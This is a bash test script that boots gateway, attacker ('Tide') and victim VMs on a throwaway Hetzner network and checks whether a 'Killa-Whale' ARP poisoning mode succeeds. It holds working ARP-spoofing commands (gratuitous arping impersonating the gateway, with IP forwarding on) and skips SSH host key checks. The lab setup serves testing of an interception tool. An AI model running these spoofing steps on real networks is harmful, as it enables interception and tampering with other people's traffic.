#!/bin/bash
# Ultra-Fast Killa-Whale Test using Pre-baked Snapshots
# Total time: ~30 seconds!

set -e

GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🐋 Killa-Whale Test (SNAPSHOT - Ultra Fast!)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Load tokens
if [ -f ~/.config/tide/hetzner.env ]; then
    source ~/.config/tide/hetzner.env
    export HCLOUD_TOKEN="$HETZNER_TIDE_TOKEN"
else
    echo -e "${RED}Error: Hetzner token not found${NC}"
    exit 1
fi

# Load golden image IDs
if [ -f ~/.config/tide/golden-images.env ]; then
    source ~/.config/tide/golden-images.env
else
    echo -e "${RED}Error: Golden images not found!${NC}"
    echo ""
    echo "Run this first to create golden images:"
    echo "  ./create-golden-images.sh"
    echo ""
    exit 1
fi

echo "Using golden images:"
echo "  Gateway:  $GOLDEN_GATEWAY_ID"
echo "  Tide:     $GOLDEN_TIDE_ID"
echo "  Victim:   $GOLDEN_VICTIM_ID"
echo ""

TIMESTAMP=$(date +%s)
NETWORK_NAME="kw-net-$TIMESTAMP"
GW_NAME="kw-gw-$TIMESTAMP"
TIDE_NAME="kw-tide-$TIMESTAMP"
VICTIM_NAME="kw-victim-$TIMESTAMP"

START_TIME=$(date +%s)

echo -e "${CYAN}[1/4] Creating network + booting from snapshots...${NC}"

# Create network
hcloud network create --name "$NETWORK_NAME" --ip-range 192.168.100.0/24 >/dev/null
NETWORK_ID=$(hcloud network list | grep "$NETWORK_NAME" | awk '{print $1}')
hcloud network add-subnet "$NETWORK_ID" --network-zone us-west --type cloud --ip-range 192.168.100.0/24 2>/dev/null

# Boot all 3 VMs from snapshots IN PARALLEL
echo "  Booting pre-configured VMs..."
hcloud server create --name "$GW_NAME" --type cpx11 --image "$GOLDEN_GATEWAY_ID" --location hil \
    --ssh-key tide-testing --network "$NETWORK_ID" >/dev/null 2>&1 &

hcloud server create --name "$TIDE_NAME" --type cpx11 --image "$GOLDEN_TIDE_ID" --location hil \
    --ssh-key tide-testing --network "$NETWORK_ID" >/dev/null 2>&1 &

hcloud server create --name "$VICTIM_NAME" --type cpx11 --image "$GOLDEN_VICTIM_ID" --location hil \
    --ssh-key tide-testing --network "$NETWORK_ID" >/dev/null 2>&1 &

wait
echo -e "${GREEN}✓ VMs booted from snapshots${NC}"

# Get IPs
GW_IP=$(hcloud server ip "$GW_NAME")
TIDE_IP=$(hcloud server ip "$TIDE_NAME")
VICTIM_IP=$(hcloud server ip "$VICTIM_NAME")

GW_PRIV=$(hcloud server describe "$GW_NAME" -o json | grep -oE '192\.168\.100\.[0-9]+' | head -1)
TIDE_PRIV=$(hcloud server describe "$TIDE_NAME" -o json | grep -oE '192\.168\.100\.[0-9]+' | head -1)
VICTIM_PRIV=$(hcloud server describe "$VICTIM_NAME" -o json | grep -oE '192\.168\.100\.[0-9]+' | head -1)

echo ""
echo "  Gateway:  $GW_IP (private: $GW_PRIV)"
echo "  Tide:     $TIDE_IP (private: $TIDE_PRIV)"
echo "  Victim:   $VICTIM_IP (private: $VICTIM_PRIV)"

echo ""
echo -e "${CYAN}[2/4] Waiting for SSH (should be quick - VMs pre-configured)...${NC}"

for i in {1..30}; do
    if ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@"$GW_IP" "echo ready" >/dev/null 2>&1 && \
       ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@"$TIDE_IP" "echo ready" >/dev/null 2>&1 && \
       ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@"$VICTIM_IP" "echo ready" >/dev/null 2>&1; then
        echo -e "${GREEN}✓ All servers ready (took $((i*2)) seconds)${NC}"
        break
    fi
    sleep 2
done

echo ""
echo -e "${CYAN}[3/4] Configuring network and launching attack...${NC}"

# Setup NAT on gateway (iptables rules need to be re-applied after reboot)
ssh -o StrictHostKeyChecking=no root@"$GW_IP" "
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    iptables -A FORWARD -i enp7s0 -o eth0 -j ACCEPT
    iptables -A FORWARD -i eth0 -o enp7s0 -m state --state RELATED,ESTABLISHED -j ACCEPT
    systemctl restart dnsmasq
" 2>/dev/null

echo "  ✓ Gateway NAT configured"

# Configure victim
ssh -o StrictHostKeyChecking=no root@"$VICTIM_IP" "
    ip route del default 2>/dev/null || true
    ip route add default via $GW_PRIV
" 2>/dev/null

echo "  ✓ Victim using real gateway"

# Get MACs
GW_MAC=$(ssh -o StrictHostKeyChecking=no root@"$GW_IP" "ip link show enp7s0 | grep ether | awk '{print \$2}'" 2>/dev/null)
TIDE_MAC=$(ssh -o StrictHostKeyChecking=no root@"$TIDE_IP" "ip link show enp7s0 | grep ether | awk '{print \$2}'" 2>/dev/null)

echo ""
echo "  Gateway MAC: $GW_MAC"
echo "  Tide MAC:    $TIDE_MAC"
echo ""

# Launch ARP poisoning attack
echo "  🚀 Launching ARP poisoning attack..."
ssh -o StrictHostKeyChecking=no root@"$TIDE_IP" "
    echo 1 > /proc/sys/net/ipv4/ip_forward
    for i in {1..10}; do
        arping -c 1 -A -I enp7s0 -s $GW_PRIV $GW_PRIV >/dev/null 2>&1
        sleep 0.1
    done
" 2>/dev/null

echo -e "${GREEN}✓ Attack completed${NC}"

echo ""
echo -e "${CYAN}[4/4] Validating results...${NC}"

# Check victim's ARP table
VICTIM_ARP_MAC=$(ssh -o StrictHostKeyChecking=no root@"$VICTIM_IP" "ip neigh show $GW_PRIV | awk '{print \$5}'" 2>/dev/null)

END_TIME=$(date +%s)
TOTAL_TIME=$((END_TIME - START_TIME))

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "RESULTS"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Test completed in: ${TOTAL_TIME} seconds"
echo ""
echo "Victim's ARP entry for gateway ($GW_PRIV):"
echo "  Victim sees:     $VICTIM_ARP_MAC"
echo "  Real Gateway:    $GW_MAC"
echo "  Tide (attacker): $TIDE_MAC"
echo ""

if [ "$VICTIM_ARP_MAC" = "$TIDE_MAC" ]; then
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${GREEN}✅ SUCCESS: Killa-Whale mode WORKS!${NC}"
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo "🎯 Victim's ARP cache has been poisoned!"
    echo "🎯 Traffic to gateway now routes through Tide"
    echo "🎯 Tide can intercept, inspect, and modify traffic"
    echo ""
    RESULT="PASS"
elif [ "$VICTIM_ARP_MAC" = "$GW_MAC" ]; then
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${RED}❌ FAIL: ARP poisoning did not work${NC}"
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo "Victim still sees real gateway MAC"
    echo "Attack was unsuccessful"
    echo ""
    RESULT="FAIL"
else
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}⚠️  UNKNOWN: Unexpected result${NC}"
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo "Victim sees unexpected MAC: $VICTIM_ARP_MAC"
    echo ""
    RESULT="UNKNOWN"
fi

echo ""
echo -e "${CYAN}Cleanup:${NC}"
echo "1) Destroy all (recommended)"
echo "2) Keep for manual inspection"
echo ""
read -p "Choice [1/2]: " CHOICE

if [ "$CHOICE" = "1" ]; then
    echo ""
    echo "Cleaning up..."
    hcloud server delete "$GW_NAME" "$TIDE_NAME" "$VICTIM_NAME" 2>/dev/null
    sleep 2
    hcloud network delete "$NETWORK_ID" 2>/dev/null
    echo -e "${GREEN}✓ All resources destroyed${NC}"
else
    echo ""
    echo "Resources kept. Connection info:"
    echo ""
    echo "  ssh root@$GW_IP    # Gateway"
    echo "  ssh root@$TIDE_IP  # Tide"
    echo "  ssh root@$VICTIM_IP # Victim"
    echo ""
    echo "Private IPs:"
    echo "  Gateway: $GW_PRIV"
    echo "  Tide:    $TIDE_PRIV"
    echo "  Victim:  $VICTIM_PRIV"
    echo ""
    echo "Cleanup manually:"
    echo "  hcloud server delete $GW_NAME $TIDE_NAME $VICTIM_NAME"
    echo "  hcloud network delete $NETWORK_ID"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Final Result: $RESULT (${TOTAL_TIME}s)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

if [ "$RESULT" = "PASS" ]; then
    exit 0
else
    exit 1
fi
